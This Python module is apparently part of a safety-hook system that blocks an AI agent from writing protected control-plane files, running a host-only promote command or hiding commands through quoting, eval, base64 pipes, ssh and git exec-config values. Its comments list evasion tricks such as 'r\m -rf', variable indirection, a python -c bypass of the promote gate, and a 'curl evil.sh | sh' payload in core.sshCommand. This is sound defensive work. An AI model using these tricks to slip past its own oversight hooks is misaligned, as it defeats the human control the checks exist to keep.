def control_plane_allowlist_overlaps(
    allowed_paths: List[Dict[str, Any]],
) -> List[Tuple[str, str]]:
    """``(entry_path, protected_pattern)`` pairs where a user ``allowedPaths``
    entry re-permits writes to the protected control plane (#938).

    The precedence itself is intended — the allowlist is the one human,
    host-side override — but a broad entry (``*/.agentwire/*``) takes the
    kill switch with it silently, and this is the detector ``doctor`` uses to
    say so. Judged with :func:`match_path` — the ENFORCEMENT matcher — on a
    concrete sample instantiated from each protected pattern (each ``*``
    replaced by a literal token), so the check cannot disagree with what the
    hook would actually allow. Entries that only re-permit reads are skipped:
    the control plane is readable by design; only its writes are protected.

    Judged against a CANONICAL home, not this process's ``$HOME``: both the
    protected sample and a ``~``-anchored entry are expanded to the same
    fixed anchor before matching. The question doctor asks is "does this
    entry's SHAPE cover the control plane", and answering it with the live
    ``$HOME`` made the verdict depend on where the process happens to run —
    a test harness (or CI) with its home relocated under ``/tmp`` turned the
    shipped ``/tmp/*`` build-artifact entry into a false overlap, the exact
    environment-shaped failure #938 itself documents from #920.
    """
    canonical_home = "/home/agentwire-canonical"

    def _anchor(p: str) -> str:
        return canonical_home + p[1:] if p.startswith("~") else p

    write_ops = ALL_OPERATIONS - {"read"}
    out: List[Tuple[str, str]] = []
    for entry in allowed_paths:
        if not entry.get("allow", set()) & write_ops:
            continue
        for prot in PROTECTED_CONTROL_PLANE_PATHS:
            sample = _anchor(prot).replace("*", "x")
            if not os.path.isabs(sample):
                sample = "/x/" + sample
            if match_path(sample, _anchor(entry["path"])):
                out.append((entry["path"], prot))
    return out


def _protected_path_patterns() -> List[str]:
    """Protected paths in both ``~``-form and ``$HOME``-expanded form.

    Commands may reference either; including both ensures the regex/glob
    matchers catch e.g. ``/Users/me/.claude/settings.json`` and
    ``~/.claude/settings.json`` alike.
    """
    out: List[str] = []
    for p in PROTECTED_CONTROL_PLANE_PATHS:
        out.append(p)
        expanded = os.path.expanduser(p)
        if expanded != p:
            out.append(expanded)
    return out


def _matched_protected_pattern(file_path: str) -> Optional[str]:
    """The protected-path pattern that matches ``file_path``, if any."""
    for pat in _protected_path_patterns():
        if match_path(file_path, pat):
            return pat
    return None


def is_protected_control_plane(file_path: str) -> bool:
    """True if ``file_path`` is part of the damage-control control plane."""
    return _matched_protected_pattern(file_path) is not None


def _protected_reason(matched_pattern: str) -> str:
    """Block reason for a protected-control-plane hit, tailored to the path.

    ``.agentwire.tasks.yml`` has a real, host-side remedy (propose-and-promote,
    #720) — name it so the agent doesn't dead-end. Everything else keeps the
    generic "edit on the host" message.
    """
    if matched_pattern.endswith(".agentwire.tasks.yml"):
        return (
            "protected task-execution control-plane file (host-owned) — draft "
            "to .agentwire.tasks.proposed.yml instead, then ask the host to run "
            "`agentwire tasks review` and `agentwire tasks promote`"
        )
    return "protected control-plane file (host-owned; edit on the host)"


def check_protected_path(
    file_path: str,
    allowed_paths: List[Dict[str, Any]],
) -> Tuple[bool, str]:
    """Block edits/writes to a control-plane file unless the user allowlisted it.

    Used by the edit/write hooks. The allowlist (a human opt-in) may override;
    nothing else does.
    """
    matched = _matched_protected_pattern(file_path)
    if matched:
        if is_path_allowed_for_op(file_path, allowed_paths, "edit"):
            return False, ""
        return True, _protected_reason(matched)
    return False, ""


def check_protected_command(
    command: str,
    allowed_paths: List[Dict[str, Any]],
) -> Tuple[bool, str]:
    """Block a bash command that writes/edits/deletes a control-plane file.

    Mirrors the ``readOnlyPaths`` matcher but is escape-hatch- and
    kill-switch-exempt. The user's allowlist may re-permit a specific path.

    Matches against masked subcommands (quotes/escapes resolved — ``r\\m``,
    ``r''m`` still normalize to the literal form) with path-mentioning content
    kept visible, so a *read* whose quoted search string merely mentions a
    destructive verb is no longer refused as a control-plane write (#922),
    while every spelling that pairs a real verb with a protected path still is.
    """
    subcommands, _ambiguous = normalize_subcommands(command)
    raw_haystacks = [command] + [s for s in subcommands if s and s != command]
    for path in _protected_path_patterns():
        # The interpreter patterns are the fail-closed net for OPAQUE program
        # text (#678) — a heredoc body is exactly what masking strips, so they
        # keep reading the raw haystacks. Only the shell-level write/delete
        # patterns move to the masked ladder haystacks.
        for hays, patterns in (
            (path_ladder_haystacks(command, path), READ_ONLY_BLOCKED),
            (raw_haystacks, INTERPRETER_WRITE_PATTERNS),
        ):
            for hay in hays:
                matched, reason = check_path_patterns(
                    hay,
                    path,
                    patterns,
                    "protected control-plane path",
                )
                if matched:
                    op = _infer_operation_from_reason(reason)
                    if is_command_path_allowed(command, allowed_paths, op):
                        break
                    return True, _protected_reason(path)
    return False, ""


# ============================================================================
# PROTECTED COMMANDS (escape-hatch- AND kill-switch-EXEMPT, like the protected
# control plane above, but keyed on COMMAND SHAPE rather than a file path)
# ============================================================================
#
# Some operations are dangerous no matter which file they touch — running
# them at all IS the confused-deputy escape, not merely writing a particular
# path. ``agentwire tasks promote`` is the first case (#720/#721 review):
# it's the host-trusted program that copies a vetted draft into the protected
# ``.agentwire.tasks.yml``. If a policed/unattended agent could just invoke
# the CLI itself, the file protection above is moot — so this, like the
# protected-path check, is evaluated before ``detect_escape_hatch`` and the
# kill switch, and has NO allowlist override (there's no legitimate reason
# for an agent to ever run this; unlike a path, there's nothing to allowlist
# it TO). This is defense in depth on TOP OF ``cmd_tasks_promote``'s own
# runtime refusal (unattended check + host-context gate in ``tasks_cli.py``)
# — that second gate is what actually closes the ``python3 -c
# "from agentwire.tasks_cli import cmd_tasks_promote; ..."`` bypass, since a
# raw interpreter call never matches a bash command pattern at all.

PROTECTED_COMMAND_PATTERNS: List[Tuple[str, str]] = [
    (
        r'\bagentwire\s+tasks\s+promote\b',
        "agentwire tasks promote writes the protected .agentwire.tasks.yml — "
        "host-only, run it from your own terminal (not through an agent).",
    ),
]


def check_protected_bash_command(command: str) -> Tuple[bool, str]:
    """Block a command matching a ``PROTECTED_COMMAND_PATTERNS`` entry.

    Unconditional — no allowlist override, no escape hatch, no kill switch
    (see module note above). These are COMMAND-PREFIX patterns, so — like the
    ``anchored`` tooldef bashToolPatterns (#675) — matched only against
    ``masked_subcommands``: quoting/escaping of the command itself still
    normalizes to the literal form (``agentwire tasks prom''ote`` can't sneak
    past), but quoted CONTENT (a commit message, an echo string) that merely
    *mentions* the phrase is masked out first, so it can't false-match.
    """
    haystacks = masked_subcommands(command)
    for pattern, reason in PROTECTED_COMMAND_PATTERNS:
        for hay in haystacks:
            try:
                if re.search(pattern, hay, re.IGNORECASE):
                    return True, reason
            except re.error:
                continue
    return False, ""


_ESCAPE_HATCH_RE = re.compile(r"#\s*allow:[ \t]*([^\n]+)", re.IGNORECASE)


def detect_escape_hatch(command: str) -> Optional[str]:
    """Return the reason if ``command`` contains a ``# allow: <reason>`` marker.

    Non-empty reason required; matches the rest of the comment line so the
    marker works on multi-line / chained commands too.
    """
    if not command:
        return None
    m = _ESCAPE_HATCH_RE.search(command)
    if not m:
        return None
    reason = m.group(1).strip()
    return reason or None


# ============================================================================
# SHELL-AWARE NORMALIZATION
# ============================================================================
#
# The bash matcher historically ran the rule regexes against the RAW command
# string. With no tokenization, trivial shell quoting/escaping defeated every
# rule: ``r\m -rf /x`` (backslash), ``r''m -rf /x`` (empty quotes),
# ``R=rm; $R -rf /x`` ($VAR indirection) all read as ALLOWED while literal
# ``rm -rf /x`` blocked. We now ALSO match against a normalized form where
# quotes/escapes are removed (via ``shlex``) and simple ``$VAR`` assignments are
# resolved, split per subcommand. Anything we cannot tokenize safely — command
# substitution (``$(...)`` / backticks), ``eval``, a ``base64 -d | sh`` pipeline,
# or unbalanced quotes — escalates to ``ask``. How that ask RESOLVES depends on
# mode, and saying "fails closed" unqualified here was #934's complaint: it is a
# block when unattended, a dialog when interactive, and under
# bypassPermissions/auto it resolves to ALLOW **unless** the shape conceals the
# verb (``ambiguity_conceals_verb``) — eval, base64-pipe, unbalanced quotes, or
# a substitution deciding what runs / feeding a wrapper's payload — in which
# case the hooks keep the ask even under bypass. Only operand-position
# substitution (``echo "$(basename $p)"``) is demoted by bypass.

_SUBSTITUTION_RE = re.compile(r"\$\(|`")
_EVAL_RE = re.compile(r"(?:^|[\s;&|({])eval(?:\s|$)")
_BASE64_PIPE_RE = re.compile(r"\bbase64\b[^\n|]*(?:-d|--decode)[^\n|]*\|", re.IGNORECASE)
_ASSIGN_RE = re.compile(
    r"(?:^|[\n;&|]|&&|\|\|)\s*([A-Za-z_]\w*)=('[^']*'|\"[^\"]*\"|[^\s;|&]*)"
)
_SHELL_OPERATORS = {";", "&&", "||", "|", "&", "\n", ";;", "|&"}


def detect_obfuscation(command: str) -> Optional[str]:
    """Return a reason string if ``command`` hides intent behind shell features.

    These constructs can smuggle a dangerous command past static matching, so we
    decline to reason about them and fail closed instead.
    """
    if _SUBSTITUTION_RE.search(command):
        return "command substitution"
    if _EVAL_RE.search(command):
        return "eval"
    if _BASE64_PIPE_RE.search(command):
        return "base64-decode pipeline"
    return None


def ambiguity_conceals_verb(command: str) -> Optional[str]:
    """Which verb-concealing shape makes ``command`` unverifiable, or None.

    Two different populations fall to the ambiguity fallback and used to share
    one tier (#934):

    * **verb concealment** — eval, a base64-decode pipeline, unbalanced
      quotes, or a substitution that decides WHAT RUNS (command position,
      behind a launcher chain, or the payload of a wrapper/exec surface).
      Nothing can analyze these; bypass must NOT demote them to allow.
    * **operand substitution** — ``$(...)`` in an ordinary argument position
      (``echo "$(basename $p)"``, a ``-m`` message). Every rule has already
      scanned the masked form; the residual ask is a courtesy confirm, and
      bypass demoting it is the documented trade.

    Judged by POSITION, not presence (#942/#943): substitutions are masked to
    a sentinel first, then each segment is walked. Anything this function
    cannot place — a subshell, an unsplittable segment — is treated as
    concealing, which errs closed.
    """
    masked, mask_err = _mask_command_substitutions(command)
    if mask_err:
        return mask_err
    if _EVAL_RE.search(masked):
        return "eval"
    if _BASE64_PIPE_RE.search(masked):
        return "base64-decode pipeline"
    segments, split_err = _scope_segments(masked)
    if split_err:
        return split_err
    for argv, _op in segments:
        _assigns, argv = _split_assignments(argv)
        if not argv:
            continue
        # Walk the launcher chain (sudo, env, uv run, timeout 5 …) to the real
        # command. A sentinel anywhere in that chain — including as the head
        # itself, or as the next link (`uv run $(echo rm) -rf`) — decides what
        # runs.
        head: Optional[str] = None
        head_idx = 0
        prev_was_option = False
        for i, tok in enumerate(argv):
            if _CMD_SUBST_SENTINEL in tok:
                return "command substitution decides what runs"
            base = tok.rsplit("/", 1)[-1]
            if base in _POSITION_WRAPPERS or _ASSIGN_TOKEN_RE.match(tok):
                prev_was_option = False
                continue
            if tok.startswith("-"):
                prev_was_option = True
                continue
            if prev_was_option or tok[:1].isdigit():
                prev_was_option = False
                continue
            head, head_idx = base, i
            break
        if head is None:
            continue
        # A substitution in the arguments of a payload-executing command (a
        # shell, an exec surface like python -c / psql -c, or ssh) is text
        # something will EXECUTE, not an operand. `psql -c "$(cat drop.sql)"`
        # is the motivating case — the permissive path used to be obscuring
        # the payload behind a substitution.
        if head in _SHELL_NAMES or head in _EXEC_SURFACES or head == "ssh":
            if any(_CMD_SUBST_SENTINEL in t for t in argv[head_idx + 1:]):
                return f"command substitution is the payload of {head}"
    return None


def normalize_subcommands(command: str) -> Tuple[List[str], Optional[str]]:
    """Tokenize ``command`` and return ``(normalized_subcommands, ambiguous)``.

    ``normalized_subcommands`` is the per-subcommand argv re-joined with single
    spaces, after ``shlex`` has stripped quotes/escapes and simple ``$VAR``
    assignments earlier in the same command have been resolved. ``ambiguous`` is
    a reason string when the command can't be tokenized safely (and the caller
    should fail closed); it is ``None`` on success.
    """
    obf = detect_obfuscation(command)
    if obf:
        return [], obf

    # Resolve simple ``VAR=value`` assignments so ``R=rm; $R -rf`` normalizes to
    # ``rm -rf``. Only literal values (no nested expansion) are resolved.
    assigns: Dict[str, str] = {}
    for m in _ASSIGN_RE.finditer(command):
        assigns[m.group(1)] = m.group(2).strip("'\"")

    try:
        lex = shlex.shlex(command, posix=True, punctuation_chars=True)
        lex.whitespace_split = True
        tokens = list(lex)
    except ValueError:
        return [], "unbalanced quotes"

    def _resolve(tok: str) -> str:
        for name, val in assigns.items():
            tok = tok.replace("${%s}" % name, val).replace("$" + name, val)
        return tok

    subs: List[str] = []
    cur: List[str] = []
    for tok in tokens:
        if tok in _SHELL_OPERATORS:
            if cur:
                subs.append(" ".join(cur))
                cur = []
            continue
        cur.append(_resolve(tok))
    if cur:
        subs.append(" ".join(cur))
    return subs, None


#
# CONTENT MASKING (#675)
#
# Tooldef rules are COMMAND-PREFIX rules (``\bgh\s+pr\s+comment\b``), but the
# haystacks above include quoted argument text — so a commit message that
# merely *mentions* "gh pr comment" false-matches the rule. Anchored rules are
# therefore matched against MASKED subcommands instead: quoted spans that can
# only be content (a quoted token containing whitespace — a message, an echo
# string, a heredoc body) are replaced with a placeholder, while quoted
# single words are kept (``"gh" pr comment`` is still a real command) and
# ``sh -c "…"`` payloads are recursively re-scanned as commands.

_MASK = "\x00"
_HEREDOC_RE = re.compile(r"<<-?\s*(['\"]?)([A-Za-z_]\w+)\1")
# ``su -c`` runs its argument through a login shell, so it belongs here
# for the same reason: the value is a command, not content.
_SHELL_NAMES = {"sh", "bash", "zsh", "dash", "ksh", "su"}

#: EXEC SURFACES (#915 review, class of #924).
#:
#: A quoted multi-word token is masked as content — right for ``git commit -m
#: "<prose>"``, and WRONG when the token is the value of an option the tool
#: EXECUTES. Once the rule files are anchored the raw haystack is no longer
#: consulted, so masking such a payload takes it from BLOCK to allow with NO
#: rule matching at all: no grant consulted, and no ``core.ambiguous-command``
#: backstop either, because with no ``$(`` the ambiguity detector never fires.
#:
#: The distinguisher cannot be SYNTAX — ``$(`` is one route here, not the
#: defining property — and it cannot be ADDITIVITY: emitting every masked token
#: as its own entry fixes all of these and reinstates #915 for all prose,
#: because a report payload becomes a command-position entry again. It has to be
#: POSITION: is this token the value of an exec-surface option? That needs a
#: table, and this is the minimal instance of #924's eventual one.
#:
#: Value = the option flags whose value is the payload. An EMPTY set means the
#: payload arrives positionally (``tmux new-session -d '<cmd>'``, ``watch -n1
#: '<cmd>'``, ``awk '<program>'``), so any content token on that command counts.
#:
#: Distinct from ``_SHELL_NAMES``, which means "this payload is a shell command"
#: and so gets RE-PARSED into subcommands. Here the payload is executable text
#: that merely contains a command (``python3 -c 'os.system("…")'``), so it is
#: emitted as a haystack string instead of re-parsed as shell.
#:
#: Missing an exec surface degrades to exactly today's behaviour, not worse.
_EXEC_SURFACES: Dict[str, set] = {
    "python": {"-c"}, "python3": {"-c"}, "python2": {"-c"},
    "perl": {"-e", "-E"},
    "ruby": {"-e"},
    "node": {"-e", "-p", "--eval"},
    "deno": {"-e", "--eval"},
    "php": {"-r"},
    "make": {"-c"},
    "tmux": set(),
    "watch": set(),
    "awk": set(), "gawk": set(), "mawk": set(),
    # Database clients (#924): the quoted operand of these flags is a STATEMENT
    # the server executes. Not shell — emitted as payload text (matched
    # anywhere, never re-parsed as shell), so the unanchored SQL/eval rules in
    # payloads.yaml see it even when masking would otherwise blank the token.
    "psql": {"-c", "--command"},
    "mysql": {"-e", "--execute"}, "mariadb": {"-e", "--execute"},
    "mongosh": {"--eval"}, "mongo": {"--eval"},
    "sqlite3": set(),
    "duckdb": {"-c"},
}
_ASSIGN_TOKEN_RE = re.compile(r"^[A-Za-z_]\w*=")

#
# COMMAND-WRAPPER PAYLOAD RESCAN (#924)
#
# ``ssh <host> "<payload>"`` is a command wrapper: its trailing argument is a
# SHELL COMMAND that runs remotely. Before this table, remote.yaml hand-wrote
# a twin of ~12 local rules and every OTHER rule silently did not apply over
# ssh — coverage was incidental to whether an unanchored rule happened to
# match the payload text. The structural fix mirrors the existing ``sh -c``
# recursion: extract the remote command and RESCAN it as a command in its own
# right, so every rule (anchored ones included, at real command positions)
# applies to the wrapped form automatically.
#
# ssh's grammar is options → host → command; everything after the first
# non-option token is the remote command (OpenSSH stops option parsing at the
# host). The value-taking option set below is from the OpenSSH 9.x manual
# (documented provenance — the local binary's private build may differ, but a
# wrong entry here degrades to today's behaviour: payload not rescanned).
_SSH_VALUE_OPTS = frozenset({
    "-B", "-b", "-c", "-D", "-E", "-e", "-F", "-I", "-i", "-J", "-L", "-l",
    "-m", "-O", "-o", "-p", "-R", "-S", "-W", "-w",
})
# Bound on wrapper/payload recursion (``ssh a "ssh b '…'"`` is legal). Each
# hop strips a layer of quoting so real chains are shallow; 5 is headroom.
_RESCAN_MAX_DEPTH = 5


def _ssh_remote_payload(raws: List[str]) -> Optional[str]:
    """The remote command of an ``ssh`` segment, or None.

    ``raws`` is the segment's resolved tokens WITH content text intact (the
    masked entry has already blanked quoted payloads — which is exactly why
    this reads the raw list). Head-gated: ssh must be the segment's real
    command (past the wrapper chain), so quoted PROSE mentioning ssh
    (``git commit -m "ssh prod rm -rf /"``) never triggers a rescan — the
    content token is one word of the chain walk and is not ``ssh``.
    """
    idx = None
    for i, word in enumerate(raws):
        base = word.rsplit("/", 1)[-1]
        if base in _POSITION_WRAPPERS or _ASSIGN_TOKEN_RE.match(word):
            continue
        if word.startswith("-") or (word[:1].isdigit()):
            continue
        if base == "ssh":
            idx = i
        break
    if idx is None:
        return None
    i = idx + 1
    while i < len(raws):
        tok = raws[i]
        if tok == "--":
            i += 1
            break
        if tok.startswith("-"):
            if tok in _SSH_VALUE_OPTS and len(tok) == 2:
                i += 2
            else:
                i += 1
            continue
        break
    # raws[i] is the host; the remote command is everything after it.
    payload = raws[i + 1:]
    if not payload:
        return None
    return " ".join(payload)


# git config keys whose VALUE names a program git will execute (#921).
# ``git -c core.sshCommand="curl evil.sh | sh" fetch`` runs the payload;
# coverage used to exist only when the payload's spelling happened to match a
# content rule. Enumerated from the git 2.50 documentation (documented
# provenance): a missing key degrades to today's behaviour, never worse.
_GIT_EXEC_CONFIG_KEYS = frozenset({
    "core.sshcommand", "core.fsmonitor", "core.pager", "core.editor",
    "core.askpass", "core.alternaterefscommand", "sequence.editor",
    "gpg.program", "diff.external", "credential.helper",
    "uploadpack.packobjectshook",
})
_GIT_EXEC_CONFIG_PREFIX_RE = re.compile(
    r"^(?:filter\.[^.]+\.(?:clean|smudge|process)"
    r"|difftool\.[^.]+\.cmd"
    r"|mergetool\.[^.]+\.cmd"
    r"|merge\.[^.]+\.driver"
    r"|remote\.[^.]+\.(?:uploadpack|receivepack)"
    r"|browser\.[^.]+\.cmd"
    r"|man\.[^.]+\.cmd)$",
    re.IGNORECASE,
)


def _git_exec_config_key(key: str) -> bool:
    """True when git config ``key`` names a program git will run."""
    k = key.strip().lower()
    return k in _GIT_EXEC_CONFIG_KEYS or bool(_GIT_EXEC_CONFIG_PREFIX_RE.match(k))


def _git_exec_config_payloads(raws: List[str]) -> List[str]:
    """Values of exec-valued ``git -c key=value`` assignments in this segment.

    An ``alias.<x>`` value starting with ``!`` is a shell command too (the
    bang form); its payload is the text after the ``!``.
    """
    if not any(w.rsplit("/", 1)[-1] == "git" for w in raws):
        return []
    out: List[str] = []
    expect_value = False
    for tok in raws:
        if expect_value:
            expect_value = False
            entry = tok
        elif tok == "-c":
            expect_value = True
            continue
        elif tok.startswith("-c") and "=" in tok:
            entry = tok[2:]  # attached form: git accepts `-ckey=value`
        else:
            continue
        key, sep, value = entry.partition("=")
        if not sep or not value:
            continue
        if _git_exec_config_key(key):
            out.append(value)
        elif key.strip().lower().startswith("alias.") and value.startswith("!"):
            out.append(value[1:])
    return out


